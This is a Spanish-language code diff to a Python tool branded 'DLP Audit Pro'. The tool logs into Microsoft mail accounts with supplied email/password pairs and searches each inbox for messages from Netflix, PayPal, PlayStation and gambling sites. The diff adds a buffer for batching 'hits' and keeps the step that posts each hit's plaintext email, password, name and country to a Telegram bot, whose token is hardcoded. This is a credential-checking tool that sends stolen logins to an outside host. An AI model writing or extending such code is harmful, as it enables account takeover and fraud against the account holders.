@@ -99,7 +99,7 @@ def emit_event(q, event_type, data):
         print(f"[EVENT] {event_type} | {data}")
 
 
-def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_chat_id="", multi_user=False):
+def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_chat_id="", multi_user=False, hit_buffer=None):
     """
     Flujo 7 pasos (basado en test_flow_dlp.py):
     1. Auth page     → microsoftonline.com con UA android
@@ -596,30 +596,57 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                 TELEGRAM_BOT_TOKEN = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
                 
                 if TELEGRAM_BOT_TOKEN and target_chat_id:
-                    try:
-                        tg_msg = (
-                            f"📣 *¡OBJETIVO DETECTADO! (HIT)* 🎯\n"
-                            f"━━━━━━━━━━━━━━━━━━\n\n"
-                            f"👤 *Usuario:* `{target_username}`\n"
-                            f"✅ *Match:* `{target_label}`\n\n"
-                            f"📧 *Correo:* `{email}`\n"
-                            f"🔑 *Pass:* `{password}`\n\n"
-                            f"🌍 *País:* {country}\n"
-                            f"👤 *Nombre:* {name}\n"
-                            f"📊 *Mensajes:* `{total_found}`\n\n"
-                            f"🔍 *Búsqueda:* `{search_q}`\n"
-                            f"🤖 *DLP Audit Pro System*"
-                        )
-                        
-                        tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-                        http_requests.post(tg_url, json={
-                            "chat_id": target_chat_id,
-                            "text": tg_msg,
-                            "parse_mode": "Markdown"
-                        }, timeout=5)
-                        emit_event(q, "info", {"message": f"✅ Alerta enviada a Telegram de {target_username}"})
-                    except Exception as e:
-                        emit_event(q, "warning", {"message": f"⚠️ Error enviando a Telegram: {str(e)[:50]}"})
+                    # Friendly name mapping
+                    friendly_names = {
+                        "info@account.netflix.com": "NETFLIX 🎬",
+                        "no_reply@vip.codere.com": "CODERE 🎰",
+                        "no-reply@mailer.caliente.mx": "CALIENTE 🔥",
+                        "noreply@zilch.com": "ZILCH 💳",
+                        "service@intl.paypal.com": "PAYPAL 💰",
+                        "reply@txn-email.playstation.com": "PLAYSTATION 🎮"
+                    }
+                    display_match = friendly_names.get(target_label.lower(), target_label)
+
+                    if hit_buffer is not None:
+                        # Batching mode: Add to buffer and skip direct Telegram
+                        hit_buffer.append({
+                            "user": target_username,
+                            "match": display_match,
+                            "email": email,
+                            "pass": password,
+                            "country": country,
+                            "name": name,
+                            "total": total_found,
+                            "query": search_q,
+                            "chat_id": target_chat_id
+                        })
+                        emit_event(q, "info", {"message": f"📦 HIT recolectado para reporte grupal ({display_match})"})
+                    else:
+                        # Individual mode: Send to Telegram immediately
+                        try:
+                            tg_msg = (
+                                f"📣 *¡OBJETIVO DETECTADO! (HIT)* 🎯\n"
+                                f"━━━━━━━━━━━━━━━━━━\n\n"
+                                f"👤 *Usuario:* `{target_username}`\n"
+                                f"✅ *Match:* `{display_match}`\n\n"
+                                f"📧 *Correo:* `{email}`\n"
+                                f"🔑 *Pass:* `{password}`\n\n"
+                                f"🌍 *País:* {country}\n"
+                                f"👤 *Nombre:* {name}\n"
+                                f"📊 *Mensajes:* `{total_found}`\n\n"
+                                f"🔍 *Búsqueda:* `{search_q}`\n"
+                                f"🤖 *DLP Audit Pro System*"
+                            )
+                            
+                            tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+                            http_requests.post(tg_url, json={
+                                "chat_id": target_chat_id,
+                                "text": tg_msg,
+                                "parse_mode": "Markdown"
+                            }, timeout=5)
+                            emit_event(q, "info", {"message": f"✅ Alerta enviada a Telegram de {target_username}"})
+                        except Exception as e:
+                            emit_event(q, "warning", {"message": f"⚠️ Error enviando a Telegram: {str(e)[:50]}"})
             else:
                 emit_event(q, "info", {"message": f"✅ 0 mensajes — inbox limpio ({target_username})"})
         else:
